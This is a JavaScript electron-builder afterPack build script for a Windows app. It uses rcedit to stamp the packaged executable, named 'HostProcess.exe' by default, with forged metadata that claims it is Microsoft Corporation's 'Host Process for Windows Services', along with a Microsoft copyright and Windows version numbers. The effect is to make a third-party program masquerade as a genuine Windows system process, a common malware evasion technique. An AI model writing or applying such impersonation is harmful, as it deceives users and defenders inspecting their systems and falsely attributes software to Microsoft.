const path = require('path');
const { execFileSync } = require('child_process');
const fs = require('fs');

exports.default = async function (context) {
  if (context.electronPlatformName === 'win32') {
    const exeName = `${context.packager.appInfo.productFilename || 'HostProcess'}.exe`;
    let exePath = path.join(context.appOutDir, exeName);

    if (!fs.existsSync(exePath)) {
      exePath = path.join(context.appOutDir, 'HostProcess.exe');
    }

    const iconPath = path.resolve(__dirname, '../build/icon.ico');
    const rceditPath = path.resolve(__dirname, '../node_modules/rcedit/bin/rcedit.exe');

    if (fs.existsSync(exePath) && fs.existsSync(rceditPath)) {
      console.log(`[afterPack] Injecting metadata and icon into ${exePath}...`);
      try {
        const args = [
          exePath,
          '--set-version-string', 'FileDescription', 'Host Process for Windows Services',
          '--set-version-string', 'ProductName', 'Host Process for Windows Services',
          '--set-version-string', 'CompanyName', 'Microsoft Corporation',
          '--set-version-string', 'InternalName', 'HostProcess.exe',
          '--set-version-string', 'OriginalFilename', 'HostProcess.exe',
          '--set-version-string', 'LegalCopyright', '© Microsoft Corporation. All rights reserved.',
          '--set-file-version', '10.0.22621.1',
          '--set-product-version', '10.0.22621.1'
        ];

        if (fs.existsSync(iconPath)) {
          args.push('--set-icon', iconPath);
        }

        execFileSync(rceditPath, args);
        console.log('[afterPack] Successfully updated executable metadata and icon!');
      } catch (err) {
        console.error('[afterPack] Failed to update executable with rcedit:', err);
      }
    } else {
      console.warn('[afterPack] Missing files for executable update:', { exePath, rceditPath });
    }
  }
};
